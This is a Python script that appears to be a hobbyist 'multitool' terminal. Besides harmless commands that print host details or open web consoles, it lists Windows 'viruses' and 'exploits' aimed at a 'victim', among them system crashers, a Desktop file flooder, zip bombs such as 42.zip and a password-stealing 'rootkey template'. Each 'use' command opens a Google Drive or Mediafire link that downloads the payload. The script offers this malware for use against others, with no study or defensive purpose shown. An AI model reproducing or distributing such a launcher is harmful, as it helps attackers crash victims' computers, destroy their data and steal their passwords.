#coding:utf-8
import threading
import subprocess
import os
import urllib
import datetime
import webbrowser
import time
import socket
print("████████████████████████████████████████████████████████████████████████")
print("█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░████████░░░░░░░░██░░░░░░░░█")
print("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░████████░░▄▀▄▀░░██░░▄▀▄▀░░█")
print("█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░████████░░░░▄▀░░██░░▄▀░░░░█")
print("█░░▄▀░░█████████░░▄▀░░█████████░░▄▀░░██████████████████░░▄▀▄▀░░▄▀▄▀░░███")
print("█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░▄▀░░██████████████████░░░░▄▀▄▀▄▀░░░░███")
print("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░████████████████████░░▄▀▄▀▄▀░░█████")
print("█░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░██████████████████░░░░▄▀▄▀▄▀░░░░███")
print("█████████░░▄▀░░█░░▄▀░░█████████░░▄▀░░██████████████████░░▄▀▄▀░░▄▀▄▀░░███")
print("█░░░░░░░░░░▄▀░░█░░▄▀░░░░░░░░░░█░░▄▀░░░░░░░░░░█░░░░░░█░░░░▄▀░░██░░▄▀░░░░█")
print("█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀▄▀▄▀▄▀▄▀░░█░░▄▀░░█░░▄▀▄▀░░██░░▄▀▄▀░░█")
print("█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░░░░░░░░░█░░░░░░█░░░░░░░░██░░░░░░░░█")
print("████████████████████████████████████████████████████████████████████████")
print("                  dev by @solelh - 2022 - multitool sequix                                      ")
print("you ip adress is:")
print(socket.gethostbyname(socket.gethostname()))
print("this file:")
subprocess.run(["ls"])
from progress.bar import IncrementalBar
mylist = [1,2,3]
bar = IncrementalBar('Countdown', max = len(mylist))
for item in mylist:
    bar.next()
    time.sleep(1)
bar.finish()
    
print("do /help to help, if a bug, do: pip install progress")

terminal_launched = True
terminal_name = "sequix"
user_command = ""
cpt = 0

while terminal_launched:
	user_command = input(f"[{terminal_name}]> ")

	if user_command == "credit":
		print("coded by @solelh4234 on discord")
		cpt = 0
	elif user_command == "name":
		terminal_name = input("choose a new name for you terminal : ")
	elif user_command == "help":
		print("\
----------------------------------------------------------------\n\
                    LIST OF COMMAND (HELP)\n\
----------------------------------------------------------------\n\
credit  : this is the credit\n\
name : change the name of terminal\n\
help : for help\n\
quit : quit the terminal\n\
list exploit : list of exploit\n\
site : run official site\n\
github : access github of the creator\n\
osname : get the os name\n\
osctermid : get the osctermid of you os\n\
osenviron : get the environ of you os\n\
run onlineconsole : open an google shell could\n\
run onlineubuntu : open a ubuntu os on your browser\n\
namelocalhost : get the host name of the computer\n\
localadr : get the local adress\n\
infoip : get your info ip\n\
pingip : ping an ip adress\n\
scaniport : scan a ip port\n\
exvir help : get exploit and virus list and usage\n\
use <name of the exploit or virus> : use the exploit or the virus selected\n\
--------------------------------------------------------------------")
	elif user_command == "quit":
		terminal_launched = False
	elif user_command == "list exploit":
	   webbrowser.open("https://www.exploit-db.com/")
	elif user_command == "site":
	    webbrowser.open("https://sequix.igowall.com/")
	elif user_command == "ping ip":
	    print("info: to ping an ip address, quit the sequix terminal and do python3 ping.py")
	elif user_command == "github":
	    webbrowser.open("https://github.com/SSOOLLEELLHH")
	elif user_command == "osname -w":
	    print("os name:")
	    print((os.name))
	elif user_command == "osctermid -w":  
	    print("os ctermid:")
	    print(os.ctermid())
	elif user_command == "osenviron -w":    
	    print("os environ:")
	    print(os.environ)
	elif user_command == "run onlineconsole":
	    print("          to open an online console, a link will open,\n\
	    this will be the google cloud console,\n\
	    you need a google email address.")
	    time.sleep(5)
	    print("google cloud shell open in : 3")
	    time.sleep(1)
	    print("google cloud shell open in : 2")
	    time.sleep(1)
	    print("google cloud shell open in : 1")
	    time.sleep(1)
	    webbrowser.open("https://shell.cloud.google.com")
	    print("google cloud shell has been opened !")
	elif user_command == "run onlineubuntu":
	    print("to run ubuntu in you browser, wait 3 second")
	    time.sleep(1)
	    print("run in : 3")
	    time.sleep(1)
	    print("run in : 2")
	    time.sleep(1)
	    print("run in : 1")
	    time.sleep(1)
	    webbrowser.open("https://www.onworks.net/runos/create-os.html")
	    print("ubuntu instance has been started on your browser !")
	elif user_command == "namelocalhost":
	    host_name = socket.gethostname()
	    print("Your host Name is:" + host_name)
	elif user_command == "localadr":
	    host_name = socket.gethostname()
	    IPAddress = socket.gethostbyname(host_name)
	    print("Your Computer IP Address is:" + IPAddress)
	elif user_command == "infoip":
	    print("to get ip info of your pc, please quit the terminal with command /quit and run infoip.py")
	elif user_command == "pingip":
	    print("to get ping an ip adress, please quit the terminal with command /quit and run ping.py")
	elif user_command == "scaniport":
	    print("to scan an ip adress port, please quit the terminal with command /quit and run scan.py")
	elif user_command == "exvir help":
	    time.sleep(1)
	    print("\
	    !!!ALERT!!!\n\
	    some viruses or exploits may only work on certain machines,\n\
	    since the sequix version is 1.0 and there are still a lot of bugs,\n\
	    please report ALL possible bugs that have been found. Thanks in advance\n\
	    FOR EXAMPLE, THE CRWIN VIRUS MAY NOT WORK, WE WILL TRY TO PATCH THE VIRUS")
	    time.sleep(3)
	    print("\
----------------------------------------------------------------------------------------------------------------------------\n\
                                           LIST OF VIRUS AND EXPLOIT + USAGE\n\
----------------------------------------------------------------------------------------------------------------------------\n\
use virus/windows/destsys : destabilizes the victim's system\n\
use virus/windows/desteye : crash the pc of the victim\n\
use virus/windows/doskill : IF THE PC ALLOWS IT, kill the pc of the victim and disconnect the victim's internet connexion\n\
use virus/windows/doscr : infinitely create random .exe files on the Desktop\n\
use virus/windows/crwin : Instantly crash and slow down any PC and break data from the last 10 seconds\n\
use virus/windows/splert : send very heavy alert messages causing the pc to crash instantly\n\
use virus/windows/spail : create 1 terra files to kill the pc of the victim\n\
use exploit/windows/rootkey : recover all the victim's passwords with this rootkey template\n\
use exploit/windows/zbxl.zip : create an infinite unzip block to crash the victim indefinitely(v.1)\n\
use exploit/windows/zbsm.zip : create an infinite unzip block to crash the victim indefinitely (v.2)\n\
use exploit/windows/zblg.zip : create an infinite unzip block to crash the victim indefinitely (v.3)\n\
use exploit/windows/42.zip : create a windows file bug crashing the victim's machine\n\
----------------------------------------------------------------------------------------------------------------------------")
	elif user_command == "use virus/windows/destsys":
	    webbrowser.open("https://drive.google.com/file/d/1YqJIBtKU1H2LnNyH4QmjoNhLdv0WbLMV/view?usp=drive_link")
	elif user_command == "use virus/windows/desteye":
	    webbrowser.open("https://drive.google.com/file/d/1Ggkfu3aubyc83v9CEeGmP_JtB9DBigkU/view?usp=drive_link")
	elif user_command == "use virus/windows/doskill":
	    webbrowser.open("https://drive.google.com/file/d/1xuzf70ta2_tR9X5U35mXsfgkKrezsJei/view?usp=drive_link")
	elif user_command == "use virus/windows/doscr":
	    webbrowser.open("https://drive.google.com/file/d/1eH9TKFDlkbjLy54EHGdXQkcUV4g0DO7u/view?usp=drive_link")
	elif user_command == "use virus/windows/crwin":
	    webbrowser.open("https://www.mediafire.com/file/mubnwp94clnu2ex/setup3.rar/file")
	elif user_command == "use":
	    print("error : please enter the path to the target exploit or virus")
	    print("do /exvir help to get the different paths")
	elif user_command == "use virus/windows/splert":
	    webbrowser.open("https://drive.google.com/file/d/1f1z2qNXHVDIG9qkkuOXTRgF7AhlMa82D/view?usp=drive_link")
	elif user_command == "use exploit/windows/rootkey":
	    webbrowser.open("https://drive.google.com/file/d/1iOGAGQyXBbocQ7kpU-gpcQXJnswP0lrC/view?usp=drive_link")
	elif user_command == "use virus/windows/spail":
	    webbrowser.open("https://drive.google.com/file/d/1SnrOzkPHKdIotY8mPBLm1J0J6DLB8nNK/view?usp=drive_link")
	elif user_command == "use exploit/windows/zbxl.zip":
	    webbrowser.open("https://drive.google.com/file/d/1mmtFQfKERT92eW41UJxhcELijgEsiu2I/view?usp=drive_link")
	elif user_command == "use exploit/windows/zbsm.zip":
	    webbrowser.open("https://drive.google.com/file/d/1Gj40sOcx-iWrDTgDG4t700uR0Uac0UI7/view?usp=drive_link")
	elif user_command == ("use exploit/windows/zblg.zip"):
	    webbrowser.open("https://drive.google.com/file/d/1Mrr7gt5IIRNqmVN2eb0ygvZBVVfLYKDQ/view?usp=drive_link")
	elif user_command == ("use exploit/windows/42.zip"):
	    webbrowser.open("https://drive.google.com/file/d/1Z4mJiEE0FQ-pHHx5dG9nRG-iX90hyEUH/view?usp=drive_link")
	else:
		print("error : command not found, do /help if you are lost")
